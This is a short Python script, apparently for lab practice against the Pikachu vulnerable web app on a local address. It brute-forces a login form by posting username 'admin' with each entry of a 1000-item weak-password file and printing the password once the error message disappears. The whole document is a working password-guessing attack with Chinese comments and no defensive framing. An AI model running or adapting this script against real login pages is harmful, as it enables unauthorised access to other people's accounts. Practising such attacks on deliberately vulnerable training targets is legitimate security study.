import requests

# 目标页面的URL
url = 'http://192.168.1.192:8086/pikachu/vul/burteforce/bf_form.php'

# 提交的用户名
# username = input("账号名")
def burteforce_form(url):
    username = 'admin'
    error_message = 'username or password is not exists～'
    password_file = '弱口令1000'

    with open(password_file, 'r') as f:
        for password in f:
            password = password.strip()

            data = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }

            response = requests.post(url, data=data)

            if error_message not in response.text:
                print('密码破解成功：', password)
                return True
            else:
                print('尝试密码：', password)

    return False






